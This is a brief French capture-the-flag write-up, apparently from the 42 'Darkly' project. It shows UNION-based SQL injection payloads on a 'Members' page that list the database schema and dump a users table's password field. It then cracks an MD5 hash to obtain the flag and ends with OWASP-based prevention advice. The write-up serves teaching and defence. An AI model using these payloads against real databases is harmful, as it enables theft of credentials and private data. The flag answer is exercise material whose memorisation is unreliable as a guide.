# Explication
Dans la page ***Members*** on peut injecter les commandes SQL et récupérer les noms de toutes les tables et de leurs colonnes avec cette commande :
`1 or 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS`

À partir de là on peut trouver n'importe quelle information dans la base de donnée. Dont le flag grâce à la commande : `1 or 1=1 UNION SELECT Commentaire, countersign FROM users`

On obtient : `Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28`

Décrypté en MD5 -> FortyTwo -> lowercase -> fortytwo

Crypté en sha256 ->

10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

# Comment l'eviter ?
Pour s'en prémunir on peut soit whitelist les inputs de l'utilisateur ou encore utiliser des requêtes paramétrées permettant de bien distinguer la commande en elle même et la valeur recherchée entrée par l'utilisateur.

source : https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-4-escaping-all-user-supplied-input